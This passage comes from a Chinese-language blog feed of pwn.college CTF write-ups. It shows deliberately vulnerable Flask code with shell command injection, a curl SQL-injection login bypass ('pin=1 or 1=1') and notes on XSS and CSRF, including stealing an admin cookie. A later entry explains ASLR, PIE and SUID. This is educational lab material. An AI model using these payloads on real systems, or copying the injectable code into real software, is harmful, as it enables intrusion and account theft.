string">"/challenge"</span><span class="token punctuation">)</span>    command <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"touch </span><span class="token interpolation"><span class="token punctuation">&#123;</span>filepath<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"DEBUG: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>command<span class="token operator">=</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>    subprocess<span class="token punctuation">.</span>run<span class="token punctuation">(</span>        command<span class="token punctuation">,</span>                    <span class="token comment"># the command to run</span>        shell<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span>                 <span class="token comment"># use the shell to run this command</span>        stdout<span class="token operator">=</span>subprocess<span class="token punctuation">.</span>PIPE<span class="token punctuation">,</span>     <span class="token comment"># capture the standard output</span>        stderr<span class="token operator">=</span>subprocess<span class="token punctuation">.</span>STDOUT<span class="token punctuation">,</span>   <span class="token comment"># 2>&amp;1</span>        encoding<span class="token operator">=</span><span class="token string">"latin"</span>            <span class="token comment"># capture the resulting output as text</span>    <span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token string-interpolation"><span class="token string">f"""        &lt;html>&lt;body>        Welcome to the touch service! Please choose a file to touch:        &lt;form>&lt;input type=text name=filepath>&lt;input type=submit value=Submit>&lt;/form>        &lt;hr>        &lt;b>Ran the command: touch </span><span class="token interpolation"><span class="token punctuation">&#123;</span>filepath<span class="token punctuation">&#125;</span></span><span class="token string">&lt;/b>        &lt;/body>&lt;/html>        """</span></span>os<span class="token punctuation">.</span>setuid<span class="token punctuation">(</span>os<span class="token punctuation">.</span>geteuid<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>os<span class="token punctuation">.</span>environ<span class="token punctuation">[</span><span class="token string">"PATH"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"</span>app<span class="token punctuation">.</span>secret_key <span class="token operator">=</span> os<span class="token punctuation">.</span>urandom<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span>port <span class="token operator">=</span> <span class="token number">8080</span> <span class="token keyword">if</span> os<span class="token punctuation">.</span>geteuid<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">else</span> <span class="token number">80</span>app<span class="token punctuation">.</span>config<span class="token punctuation">[</span><span class="token string">'SERVER_NAME'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"challenge.localhost:</span><span class="token interpolation"><span class="token punctuation">&#123;</span>port<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span>app<span class="token punctuation">.</span>run<span class="token punctuation">(</span><span class="token string">"challenge.localhost"</span><span class="token punctuation">,</span> port<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="SQLi-1"><a href="#SQLi-1" class="headerlink" title="SQLi 1"></a>SQLi 1</h2><p>这一关有两个潜在的注入点，一个是<code>username</code>，一个是<code>pin</code>，后续的代码需要检查<code>username</code>字段必须为<code>admin</code>，所以就只剩下另外的一个注入点<code>pin</code>了。</p><p><code>WHERE</code>字句后面是一个整体，你只要保证这个整体为<code>True</code>就可以。</p><p><code>curl -L -c cookie i -v -X POST http://challenge.localhost:80/ -H &quot;Content-Type: application/x-www-form-urlencoded&quot; -d &quot;username=admin&amp;pin=1%20or%201=1</code></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">try</span><span class="token punctuation">:</span>    <span class="token comment"># https://www.sqlite.org/lang_select.html</span>    query <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f'SELECT rowid, * FROM users WHERE username = "</span><span class="token interpolation"><span class="token punctuation">&#123;</span>username<span class="token punctuation">&#125;</span></span><span class="token string">" AND pin = </span><span class="token interpolation"><span class="token punctuation">&#123;</span>pin<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"DEBUG: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>query<span class="token operator">=</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>    user <span class="token operator">=</span> db<span class="token punctuation">.</span>execute<span class="token punctuation">(</span>query<span class="token punctuation">)</span><span class="token punctuation">.</span>fetchone<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">except</span> sqlite3<span class="token punctuation">.</span>Error <span class="token keyword">as</span> e<span class="token punctuation">:</span>    flask<span class="token punctuation">.</span>abort<span class="token punctuation">(</span><span class="token number">500</span><span class="token punctuation">,</span> <span class="token string-interpolation"><span class="token string">f"Query: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>query<span class="token punctuation">&#125;</span></span><span class="token string">\nError: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>e<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span><span class="token keyword">if</span> <span class="token keyword">not</span> user<span class="token punctuation">:</span>    flask<span class="token punctuation">.</span>abort<span class="token punctuation">(</span><span class="token number">403</span><span class="token punctuation">,</span> <span class="token string">"Invalid username or pin"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h2><p>我觉得题目的解释关于这几种常见漏洞的解释比较好，就抄下来了</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">Semantic gaps can occur (and lead to security issues) at the interface of any two technologies. So far, we have seen them happen between:    A web application and the file system, leading to path traversal.    A web application and the command line shell, leading to command injection.    A web application and the database, leading to SQL injection.One part of the web application story that we have not yet looked at is the web browser. We will remedy that oversight with this challenge.A modern web browser is an extraordinarily complex piece of software. It renders HTML, executes JavaScript, parses CSS, lets you access pwn.college, and much much more. Specifically important to our purposes is the HTML that you have seen being generated by every challenge in this module. When the web application generated paths, we ended up with path traversals. When the web application generated shell commands, we ended up with shell injections. When the web application generated SQL queries, we ended up with SQL injections. Do we really think HTML will fare any better? Of course not.The class of vulnerabilities in which injections occur into client-side web data (such as HTML) is called Cross Site Scripting, or XSS for short (to avoid the name collision with Cascading Style Sheets). Unlike the previous injections, where the victim was the web server itself, the victims of XSS are other users of the web application. In a typical XSS exploit, an attacker will cause their own code to be injected into (typically) the HTML produced by a web application and viewed by a victim user. This will then allow the attacker to gain some control within the victim's browser, leading to a number of potential downstream shenanigans.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>关于反射性xss的定义</p><p>Reflected XSS happens when a URL parameter is rendered into a generated HTML page in a way that, again, allows the attacker to insert HTML/JavaScript/etc. To carry out such an attack, an attacker typically needs to trick the victim into visiting a very specifically-crafted URL with the right URL parameters. This is unlike a Stored XSS, where an attacker might be able to simply make a post in a vulnerable forum and wait for victims to stumble onto it.</p><h2 id="XSS-3"><a href="#XSS-3" class="headerlink" title="XSS 3"></a>XSS 3</h2><p>首先我利用存储型xss，使用hacker登录，注入一个script脚本请求publish接口，这样再利用vicitm程序进行登录的时候，会自动请求publish接口，这样就能显示完整的flag。</p><h2 id="XSS-7"><a href="#XSS-7" class="headerlink" title="XSS 7"></a>XSS 7</h2><p>这个题目的提示说，可以只用nc监听某个端口就可以。但是nc监听端口，不会自动返回可以接受跨域请求的数据包，所以<br>我还是使用flask框架创建了一个服务器，返回相应的跨域请求数据头。然后接受admin对应的cookie字段。</p><p>明白了，这里需要用简单请求。具体可以看问题2，将cookie包含在Accept这个字段里面，这样不用引起跨域。</p><p>试了一下，还是会产生跨域。</p><h2 id="CSRF-3"><a href="#CSRF-3" class="headerlink" title="CSRF 3"></a>CSRF 3</h2><p>这一关是要先访问<code>hacker.localhost:1337</code>, 然后在<code>hacker.localhost:1337</code>的<code>1.html</code>中使用<code>script</code>标签请求<code>challenge.localhost/ephemeral?msg=&lt;script&gt;alert(&quot;Test&quot;)&lt;%2Fscript&gt;&lt;script&gt;</code>。</p><p>如果你想在<code>1.html</code>中使用<code>script</code>请求的话，你要注意，如果你的js代码中包含<code>&lt;/script&gt;</code>, 浏览器在解析的时候，可能就提前闭合<code>&lt;script&gt;</code>了。这种情况下，代码不会正常运行。</p><p>我这一关没有用<code>script</code>去完成请求操作，只用了重定向完成的。这样不会用这种问题。</p><p>但是我发现了另一个问题，如果你在<code>input</code>的输入框中输入<code>&lt;script&gt;&lt;%2fscript&gt;</code>，那么这个字符串还会再进行一次Url编码变成<code>&lt;script&gt;&lt;%252fscript&gt;</code>，第二次url编码将<code>%</code>变成了<code>%25</code>。这跟直接在url输入框中直接传参的是不一样的，在url输入框中传参，只有一次url编码。</p><p>还有一个问题，如果你只输入<code>&lt;script&gt;alert(&quot;Test&quot;)</code>。那么浏览器会在页面的最后补全一个<code>&lt;/script&gt;</code>。浏览器会尝试自动修复未闭合的 HTML 标签，以确保页面可以正确渲染。当你输入一个未闭合的<code>&lt;script&gt;</code>标签时，浏览器会假设你忘记闭合它，并自动在页面的末尾添加<code> &lt;/script&gt;</code>。</p><p>原本是这样</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">></span></span>You have received an ephemeral message!<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span>The message: <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span>alert("Test")<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>hr</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span><span class="token punctuation">></span></span>Craft an ephemeral message:<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>text</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>msg</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>/ephemeral</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>submit</span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>Submit</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>浏览器渲染完成之后变成这样了</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">></span></span>You have received an ephemeral message!<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span>The message: <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">    <span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">"Test"</span><span class="token punctuation">)</span>    <span class="token operator">&lt;</span>hr<span class="token operator">></span><span class="token operator">&lt;</span>form<span class="token operator">></span>Craft an ephemeral message<span class="token operator">:</span><span class="token operator">&lt;</span>input type<span class="token operator">=</span>text name<span class="token operator">=</span>msg action<span class="token operator">=</span><span class="token operator">/</span>ephemeral<span class="token operator">></span><span class="token operator">&lt;</span>input type<span class="token operator">=</span>submit value<span class="token operator">=</span>Submit<span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>form<span class="token operator">></span>    <span class="token operator">&lt;</span><span class="token operator">/</span>body<span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>html<span class="token operator">></span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id=""><a href="#" class="headerlink" title=""></a></h2>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PWN-College-Program-Exploitation-Writeup</title>
      <link href="/2024/08/13/pwn-college-program-exploitation-writeup/"/>
      <url>/2024/08/13/pwn-college-program-exploitation-writeup/</url>
      
        <content type="html"><![CDATA[<h1 id="pwn-college-Program-Exploitation"><a href="#pwn-college-Program-Exploitation" class="headerlink" title="pwn.college Program-Exploitation"></a>pwn.college Program-Exploitation</h1><p><a href="https://pwn.college/program-security/program-exploitation/">https://pwn.college/program-security/program-exploitation/</a></p><h2 id="值得学习的"><a href="#值得学习的" class="headerlink" title="值得学习的"></a>值得学习的</h2><h3 id="1-在二进制程序不开启地址随机化的情况下，操作系统如何保证二进制程序每次都在相同的地址加载？"><a href="#1-在二进制程序不开启地址随机化的情况下，操作系统如何保证二进制程序每次都在相同的地址加载？" class="headerlink" title="1. 在二进制程序不开启地址随机化的情况下，操作系统如何保证二进制程序每次都在相同的地址加载？"></a>1. 在二进制程序不开启地址随机化的情况下，操作系统如何保证二进制程序每次都在相同的地址加载？</h3><p>在二进制程序不开启地址空间布局随机化（ASLR, Address Space Layout Randomization）的情况下，操作系统可以通过以下机制保证二进制程序每次都在相同的地址加载：</p><ol><li>固定的加载基地址<br>在编译程序时，链接器会将二进制程序的各个部分（如代码段、数据段、堆栈等）指定一个默认的加载地址，这被称为基地址。当 ASLR 未启用时，操作系统会按照这个默认的基地址将程序加载到内存中。<br>由于没有开启地址随机化，每次执行这个程序时，它的代码段、数据段等都会加载到同样的内存地址。</li><li>操作系统加载器的行为<br>操作系统的加载器在加载可执行文件时，会检查是否开启了 ASLR。如果未开启，加载器会遵循可执行文件的默认基地址，并按照程序的地址映射表（通常是可执行文件中的程序头表或段表）将程序的各个部分加载到指定的固定地址。<br>在这种情况下，程序的每次加载地址都是固定的，这意味着所有函数、变量的内存地址在每次程序执行时都是一致的。</li><li>编译时的控制<br>在编译可执行文件时，开发者或编译器可以通过指定编译选项来关闭 ASLR。例如，在 GCC 编译器中，可以使用 -no-pie 选项生成一个不支持位置无关代码的可执行文件，这样该文件会有一个固定的基地址，而不会在每次加载时随机化。</li><li>静态链接 vs 动态链接<br>静态链接：在静态链接的程序中，所有库函数代码都被嵌入到可执行文件中，因此整个程序在内存中的布局是确定的，不依赖于动态链接库的加载地址。<br>动态链接：在动态链接的程序中，虽然主程序的加载地址是固定的，但动态链接库的加载地址可能会发生变化。如果 ASLR 未开启，动态库也会被加载到固定的地址。<br><strong>总结：</strong><br>当 ASLR 未开启时，操作系统通过遵循可执行文件中的默认加载地址和程序的内存布局来保证二进制程序每次都在相同的内存地址加载。这种固定加载地址的行为使得程序的各个部分在内存中的位置是确定的，但也因此增加了程序易受攻击的风险（例如基于内存地址的攻击）。这就是为什么现代操作系统通常会默认开启 ASLR 以提高程序的安全性。</li></ol><p>如果有两个程序都没有开启 ASLR，它们的加载地址不一定会相同，具体取决于几个因素：</p><ol><li>程序的默认基地址<br>每个可执行文件在编译时，链接器通常会为其指定一个默认的基地址。如果两个程序的默认基地址相同，并且没有其他干扰因素，它们在没有开启 ASLR 的情况下可能会加载到相同的内存地址。<br>但是，如果两个程序的默认基地址不同，即使没有开启 ASLR，它们也会被加载到不同的地址。</li><li>内存映射<br>即使两个程序具有相同的默认基地址，操作系统在加载时还需要考虑系统的内存使用情况。如果第一个程序已经占用了某些内存区域，操作系统可能会选择将第二个程序加载到不同的内存地址以避免冲突。<br>例如，如果第一个程序使用了某些共享库或内存映射文件，可能会占用一定的地址空间，导致第二个程序无法加载到完全相同的地址。</li><li>进程隔离<br>现代操作系统使用虚拟内存来实现进程隔离，即每个进程在其虚拟地址空间内运行，彼此独立。因此，虽然两个程序的加载地址在它们各自的虚拟地址空间中可以是相同的，但它们在实际的物理内存中并不共享相同的内存区域。<br>从每个程序的视角来看，它们可能看到相同的加载地址，但由于虚拟内存机制，这些地址映射到不同的物理内存位置。</li><li>动态链接库<br>如果两个程序使用相同的动态链接库，并且这些库没有开启 ASLR，它们的加载地址可能会在不同进程中一致。这会导致某些地址相同，但并不一定是整个程序都在相同的地址。<br><strong>结论：</strong><br>两个没有开启 ASLR 的程序不一定会加载到相同的地址，即使它们的默认基地址相同。加载地址的实际分配还受内存布局、系统资源使用情况以及操作系统的内存管理策略的影响。虚拟内存机制确保了每个程序有独立的虚拟地址空间，这意味着即使加载地址相同，它们在实际物理内存中的位置是不同的。</li></ol><h3 id="2-GDB-和-程序运行时的栈基址差异"><a href="#2-GDB-和-程序运行时的栈基址差异" class="headerlink" title="2. GDB 和 程序运行时的栈基址差异"></a>2. GDB 和 程序运行时的栈基址差异</h3><p><strong>GDB 中的栈基址</strong></p><ul><li>调试器的影响：当使用 GDB 调试程序时，GDB 插入了一些额外的调试信息和栈帧。这可能会影响栈的起始地址和布局。例如，GDB 可能会使用额外的栈帧来保存调试信息，或者在程序的栈中插入调试断点。</li><li>栈的显示：GDB 可能会显示调试器视图下的栈基址，这可能与程序在正常运行时的栈基址不同。</li></ul><p><strong>程序运行时的栈基址</strong></p><ul><li>运行时环境：在程序正常运行时，栈的基址由操作系统分配，并且可能受到各种因素的影响，包括操作系统的内存管理和地址空间布局（例如 ASLR）。</li><li>栈布局：程序在实际运行时，其栈的起始位置是由操作系统分配的，通常与调试时的环境不同。</li></ul><h3 id="3-PIE-和ASLR的关系？"><a href="#3-PIE-和ASLR的关系？" class="headerlink" title="3. PIE 和ASLR的关系？"></a>3. PIE 和ASLR的关系？</h3><p>PIE（Position-Independent Executable）模式是现代操作系统中用来增强程序安全性的一种机制。它使得生成的可执行文件在内存中加载时可以被放置在不同的内存地址，从而减少某些类型攻击（例如缓冲区溢出）的成功率。</p><h4 id="1-PIE-的作用"><a href="#1-PIE-的作用" class="headerlink" title="1. PIE 的作用"></a>1. <strong>PIE 的作用</strong></h4><p>PIE 是一种让可执行文件具备位置无关特性的机制。传统上，可执行文件在内存中总是加载到固定的地址，而 PIE 可执行文件则可以加载到内存中的任意地址，这一特性使得它更难成为攻击目标。</p><h4 id="2-PIE-的实现原理"><a href="#2-PIE-的实现原理" class="headerlink" title="2. PIE 的实现原理"></a>2. <strong>PIE 的实现原理</strong></h4><p>PIE 模式结合了以下技术：</p><ul><li><strong>位置无关代码（Position-Independent Code, PIC）</strong>：PIE 可执行文件的代码是位置无关的，这意味着它不依赖于固定的内存地址，可以在任意地址运行。通过使用相对地址和偏移量，代码的执行不依赖于绝对地址。</li><li><strong>动态链接</strong>：PIE 可执行文件通常是动态链接的，它们在运行时被链接器加载到内存中，而不是在编译时决定其内存位置。</li><li><strong>ASLR（地址空间布局随机化）</strong>：PIE 模式通常与 ASLR 配合使用，操作系统会在每次加载 PIE 可执行文件时，为其分配一个不同的加载地址。这使得攻击者无法预测程序的内存布局，增加了攻击难度。</li></ul><h4 id="3-PIE-的优点"><a href="#3-PIE-的优点" class="headerlink" title="3. PIE 的优点"></a>3. <strong>PIE 的优点</strong></h4><ul><li><strong>增强安全性</strong>：PIE 结合 ASLR 增加了攻击者的难度，因为每次执行时内存地址可能不同，减少了基于固定地址的漏洞利用可能性。</li><li><strong>灵活性</strong>：PIE 可执行文件可以在任何内存地址加载，这对多进程或多线程的程序尤其有利，因为它们可以共享代码段但使用不同的内存布局。</li></ul><h4 id="4-如何生成-PIE-可执行文件"><a href="#4-如何生成-PIE-可执行文件" class="headerlink" title="4. 如何生成 PIE 可执行文件"></a>4. <strong>如何生成 PIE 可执行文件</strong></h4><p>在编译程序时，可以通过特定的编译器选项生成 PIE 可执行文件。以 GCC 为例：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">gcc <span class="token parameter variable">-fPIE</span> <span class="token parameter variable">-pie</span> <span class="token parameter variable">-o</span> your_program your_program.c<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>**<code>-fPIE</code>**：告诉编译器生成位置无关的代码。</li><li>**<code>-pie</code>**：告诉链接器生成一个位置无关的可执行文件。</li></ul><h4 id="5-如何检查程序是否是-PIE"><a href="#5-如何检查程序是否是-PIE" class="headerlink" title="5. 如何检查程序是否是 PIE"></a>5. <strong>如何检查程序是否是 PIE</strong></h4><p>你可以使用 <code>readelf</code> 或 <code>objdump</code> 来检查一个可执行文件是否是 PIE。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">readelf <span class="token parameter variable">-h</span> your_program <span class="token operator">|</span> <span class="token function">grep</span> <span class="token string">'Type:'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>如果显示 <code>DYN</code>，则说明该可执行文件是一个 PIE 文件。</li><li>如果显示 <code>EXEC</code>，则说明该可执行文件不是 PIE 文件。</li></ul><p>或者使用 <code>objdump</code>：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">objdump <span class="token parameter variable">-f</span> your_program <span class="token operator">|</span> <span class="token function">grep</span> <span class="token string">'file format'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="6-PIE-与-ASLR-的关系"><a href="#6-PIE-与-ASLR-的关系" class="headerlink" title="6. PIE 与 ASLR 的关系"></a>6. <strong>PIE 与 ASLR 的关系</strong></h4><ul><li><strong>ASLR（地址空间布局随机化）</strong>：ASLR 是一种安全技术，用于随机化程序在内存中的地址空间，包括栈、堆、共享库等。PIE 可执行文件配合 ASLR 可以实现更加有效的随机化，因为整个可执行文件的加载地址也会被随机化。</li><li><strong>PIE 的重要性</strong>：在支持 ASLR 的系统中，如果可执行文件是 PIE 类型，那么其加载地址也会被随机化。如果不是 PIE 类型，则 ASLR 对其作用有限，通常只能随机化栈、堆等部分内存区域，而代码段的加载地址仍然是固定的。</li></ul><h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><ul><li><strong>PIE（Position-Independent Executable）</strong> 是一种生成位置无关可执行文件的技术，增强了程序的安全性。</li><li><strong>PIE</strong> 使得可执行文件可以在内存中的任意位置加载，通常与 <strong>ASLR</strong> 结合使用，防止基于固定地址的攻击。</li><li>生成 PIE 可执行文件需要使用编译器和链接器的特定选项，可以通过工具检查文件是否为 PIE。</li></ul><h3 id="4-SUID"><a href="#4-SUID" class="headerlink" title="4. SUID"></a>4. SUID</h3><p>SUID（Set User ID）是一种文件权限设置，用于在执行文件时临时提升用户权限。在 UNIX 和 Linux 系统中，SUID 位的作用是让执行该文件的用户以文件所有者的身份运行程序，而不是以执行者自身的身份运行。</p><h4 id="SUID-的详细解释"><a href="#SUID-的详细解释" class="headerlink" title="SUID 的详细解释"></a>SUID 的详细解释</h4><p>SUID 位：在文件权限的三组权限位中（所有者、组、其他人），SUID 位在所有者权限组中的执行权限位（第三位）设置。它的符号表示为小写的 s 或大写的 S：</p><ul><li>s：表示文件的所有者具有执行权限，并且设置了 SUID 位。</li><li>S：表示文件的所有者没有执行权限，但设置了 SUID 位（这种情况较少见，因为没有执行权限的 SUID 位通常是无意义的）。</li></ul><p>工作原理：当一个用户执行带有 SUID 位的可执行文件时，操作系统会将该用户的权限临时提升为文件所有者的权限。通常，这意味着一个普通用户执行一个 SUID 程序时，该程序将以 root 用户的权限运行。</p><p>假设有一个程序 example，其文件权限如下：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">-rwsr-xr-x <span class="token number">1</span> root root <span class="token number">12345</span> Aug <span class="token number">24</span> <span class="token number">2024</span> /path/to/example<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>rws：表示文件所有者 root 对文件有读、写、执行权限，并且设置了 SUID 位。</li><li>r-x：表示文件所属组对文件有读和执行权限。</li><li>r-x：表示其他用户对文件有读和执行权限。</li></ul><p>在这种情况下，当普通用户（如 user）执行 /path/to/example 时，操作系统会让该程序以 root 的权限运行，而不是 user 的权限。</p><h4 id="设置-SUID-位"><a href="#设置-SUID-位" class="headerlink" title="设置 SUID 位"></a>设置 SUID 位</h4><p>SUID 位对应的八进制值是 4，它会作为一个额外的位加在标准的三位八进制权限前面。</p><p>例如：</p><p>4755: 表示文件的权限是 rwsr-xr-x。具体的分解如下：<br>第一位 4：表示 SUID 位被设置。<br>第二位 7：表示文件所有者有读、写、执行权限 (rwx)。<br>第三位 5：表示文件所属组有读、执行权限 (r-x)。<br>第四位 5：表示其他用户有读、执行权限 (r-x)。</p><h3 id="5-int-cdecl-main-int-argc-const-char-argv-const-char-envp-main这些参数是如何传递的"><a href="#5-int-cdecl-main-int-argc-const-char-argv-const-char-envp-main这些参数是如何传递的" class="headerlink" title="5. int __cdecl main(int argc, const char **argv, const char **envp) main这些参数是如何传递的"></a>5. int __cdecl main(int argc, const char **argv, const char **envp) main这些参数是如何传递的</h3><p>在 C/C++ 程序中，<code>main()</code> 函数的参数 <code>argc</code>、<code>argv</code> 和 <code>envp</code> 是由操作系统传递给程序的。它们分别表示命令行参数的数量、命令行参数的数组，以及环境变量的数组。以下是它们是如何传递的详细过程：</p><h4 id="1-启动进程"><a href="#1-启动进程" class="headerlink" title="1. 启动进程"></a>1. <strong>启动进程</strong></h4><p>当你在命令行中启动一个程序时（例如 <code>./myprogram arg1 arg2</code>），操作系统会创建一个新的进程，并将程序的可执行文件加载到该进程的内存空间。</p><h4 id="2-设置堆栈"><a href="#2-设置堆栈" class="headerlink" title="2. 设置堆栈"></a>2. <strong>设置堆栈</strong></h4><p>在加载程序时，操作系统会为该进程设置一个初始堆栈。堆栈是一个数据结构，用于存储函数调用的局部变量、返回地址、以及函数的参数。</p><h4 id="3-传递命令行参数-argc-和-argv"><a href="#3-传递命令行参数-argc-和-argv" class="headerlink" title="3. 传递命令行参数 (argc 和 argv)"></a>3. <strong>传递命令行参数 (<code>argc</code> 和 <code>argv</code>)</strong></h4><ul><li><strong><code>argv</code> 数组</strong>: 操作系统会将命令行参数存储在堆栈上。具体来说，它会将每个参数的字符串存储在堆栈中的某个位置，并在 <code>argv</code> 数组中存储指向这些字符串的指针。<code>argv[0]</code> 通常是程序的名称或路径，<code>argv[1]</code> 到 <code>argv[argc-1]</code> 是传递给程序的其他参数。<code>argv[argc]</code> 为 <code>NULL</code>，表示数组的结束。</li><li><strong><code>argc</code> 参数</strong>: 操作系统还会将命令行参数的数量，即 <code>argc</code>，作为一个整数值存储在堆栈上。</li></ul><h4 id="4-传递环境变量-envp"><a href="#4-传递环境变量-envp" class="headerlink" title="4. 传递环境变量 (envp)"></a>4. <strong>传递环境变量 (<code>envp</code>)</strong></h4><ul><li><strong><code>envp</code> 数组</strong>: 环境变量是以字符串形式传递的，格式为 <code>key=value</code>。操作系统会将所有的环境变量存储在堆栈上，并创建一个 <code>envp</code> 数组，其中每个元素都是一个指向这些字符串的指针。<code>envp</code> 数组的最后一个元素是 <code>NULL</code>，表示数组结束。</li></ul><h4 id="5-堆栈布局"><a href="#5-堆栈布局" class="headerlink" title="5. 堆栈布局"></a>5. <strong>堆栈布局</strong></h4><p>在实际传递给 <code>main()</code> 函数之前，堆栈的布局通常如下所示（从高地址到低地址）：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">envp<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> -<span class="token operator">></span> <span class="token string">"HOME=/home/user"</span>envp<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> -<span class="token operator">></span> <span class="token string">"PATH=/usr/bin"</span><span class="token punctuation">..</span>.envp<span class="token punctuation">[</span>n<span class="token punctuation">]</span> -<span class="token operator">></span> NULL               <span class="token punctuation">;</span> 环境变量数组的结束标志argv<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> -<span class="token operator">></span> <span class="token string">"./myprogram"</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> -<span class="token operator">></span> <span class="token string">"arg1"</span>argv<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> -<span class="token operator">></span> <span class="token string">"arg2"</span><span class="token punctuation">..</span>.argv<span class="token punctuation">[</span>argc<span class="token punctuation">]</span> -<span class="token operator">></span> NULL            <span class="token punctuation">;</span> 参数数组的结束标志argc <span class="token operator">=</span> <span class="token number">3</span>                      <span class="token punctuation">;</span> 参数数量<span aria-hidden="true" 